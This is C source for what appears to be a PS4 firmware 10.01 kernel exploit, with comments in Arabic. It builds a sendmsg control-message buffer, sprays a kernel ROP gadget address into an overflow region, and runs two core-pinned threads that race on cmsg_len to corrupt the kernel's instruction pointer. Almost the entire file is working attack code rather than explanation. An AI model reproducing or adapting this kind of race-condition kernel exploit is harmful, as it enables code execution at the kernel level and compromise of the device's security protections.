#include <ps4.h>

// --- الهياكل المفقودة (متوافقة مع libPS4) ---
struct cmsghdr { uint32_t cmsg_len; int cmsg_level; int cmsg_type; };
struct msghdr {
    void *msg_name; uint32_t msg_namelen; struct iovec *msg_iov;
    int msg_iovlen; void *msg_control; uint32_t msg_controllen; int msg_flags;
};

typedef struct { uint64_t bits[16]; } cpuset_t;
#define CPU_SET(n, p) ((p)->bits[(n)/64] |= (1ULL << ((n)%64)))
#define CPU_ZERO(p) memset((p), 0, sizeof(cpuset_t))

// --- إعدادات الاستغلال ---
#define PS4_PAGE_SIZE 0x4000
#define OVERFLOW_SIZE 1024 // زيادة الحجم لضمان التغطية الكاملة
#define NCMSG         14
#define OFFSET_TARGET 0x48 // الإزاحة الموثوقة لـ FreeBSD mbuf
#define OFF_PUSH_RSP_POP_RSI_RET 0x9B3EE6 

uint8_t *BaseArea;
struct cmsghdr *ControlBuf;
size_t ControlBufLen;
volatile int stop_race = 0;
uint64_t n_tries = 0;
uint32_t current_delay = 40;

// --- 1. بناء البفر مع الرش التصاعدي من 0x48 ---
void BuildPrecisionBuffer(uint64_t kbase) {
    printf_debug("[BUILD] Initializing Precision Spray (Offset: 0x48)...\n");
    
    size_t cmsgsize = NCMSG * sizeof(struct cmsghdr);
    size_t allocsz = (cmsgsize + OVERFLOW_SIZE + PS4_PAGE_SIZE - 1) & ~(PS4_PAGE_SIZE - 1);
    
    BaseArea = (uint8_t *)mmap(NULL, allocsz + PS4_PAGE_SIZE, PROT_READ | PROT_WRITE, 0x0002 | 0x1000, -1, 0);
    mprotect(BaseArea + allocsz, PS4_PAGE_SIZE, PROT_NONE);

    uint8_t *aligned_base = BaseArea + (allocsz - (cmsgsize + OVERFLOW_SIZE));
    ControlBuf = (struct cmsghdr *)aligned_base;
    ControlBufLen = cmsgsize;

    for (int i = 0; i < NCMSG; i++) {
        ControlBuf[i].cmsg_len = sizeof(struct cmsghdr);
        ControlBuf[i].cmsg_type = 7;
    }

    uintptr_t trigger = kbase + OFF_PUSH_RSP_POP_RSI_RET;
    uint8_t *overflow_ptr = (uint8_t *)aligned_base + cmsgsize;

    // --- الرش التصاعدي الموثوق ---
    // نحن نترك أول 0x48 بايت "نظيفة" أو مملوءة بحذر، ثم نرش العنوان تصاعدياً
    // لضمان أنه عند حدوث الـ Race، سيتم دهس الـ RIP بالـ Gadget يقيناً.
    for (int i = OFFSET_TARGET; i < OVERFLOW_SIZE - 8; i += 8) {
        *(uintptr_t *)(overflow_ptr + i) = trigger;
    }

    printf_debug("[BUILD] Spray active from +0x%x to +0x%x\n", OFFSET_TARGET, OVERFLOW_SIZE);
}

// --- 2. خيط التخريب (Wrecker) - Core 1 ---
void *wrecker_thread(void *arg) {
    (void)arg;
    while (!stop_race) {
        ControlBuf[NCMSG-1].cmsg_len = sizeof(struct cmsghdr);
        for(volatile int i = 0; i < current_delay; i++); 
        
        ControlBuf[NCMSG-1].cmsg_len = 0xFFFFFFFF;
        for(volatile int i = 0; i < 60; i++);

        // التغيير التدريجي للتوقيت
        current_delay++;
        if (current_delay > 1500) current_delay = 40; 
    }
    return NULL;
}

// --- 3. خيط التنفيذ (Executor) - Core 2 ---
void *executor_thread(void *arg) {
    (void)arg;
    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_control = ControlBuf;
    msg.msg_controllen = (uint32_t)ControlBufLen;
    const int bad_fd = 666;

    printf_debug("[EXEC] Racing started on Core 2...\n");
    
    while (!stop_race) {
        n_tries++;
        syscall(28, bad_fd, &msg, 0); 
        
        if (errno == 14) { // EFAULT الحلم!
            stop_race = 1;
            printf_debug("[SUCCESS] *** EFAULT CAUGHT! ***\n");
            printf_debug("[SUCCESS] Tries: %llu, Final Delay: %u\n", n_tries, current_delay);
            break;
        }
        
        if (n_tries % 250000 == 0) {
            printf_debug("[INFO] Tries: %llu, Delay: %u, Still Stable...\n", n_tries, current_delay);
        }
    }
    return NULL;
}

int _main(struct thread *td) {
    (void)td;
    initKernel(); initLibc(); initSysUtil();
    
    printf_debug("\n--- [PS4 10.01 PRECISION RACE] ---\n");

    uint64_t kbase = get_kernel_base();
    BuildPrecisionBuffer(kbase);

    cpuset_t cpuset1, cpuset2;
    CPU_ZERO(&cpuset1); CPU_SET(1, &cpuset1); 
    CPU_ZERO(&cpuset2); CPU_SET(2, &cpuset2); 

    ScePthread wrid, exid;
    
    scePthreadCreate(&wrid, NULL, wrecker_thread, NULL, "wrecker");
    pthread_setaffinity_np(wrid, sizeof(cpuset_t), &cpuset1);

    scePthreadCreate(&exid, NULL, executor_thread, NULL, "executor");
    pthread_setaffinity_np(exid, sizeof(cpuset_t), &cpuset2);

    scePthreadJoin(exid, NULL);
    stop_race = 1;
    scePthreadJoin(wrid, NULL);

    printf_debug("[FINISH] Exploit loop exited.\n");
    return 0;
}
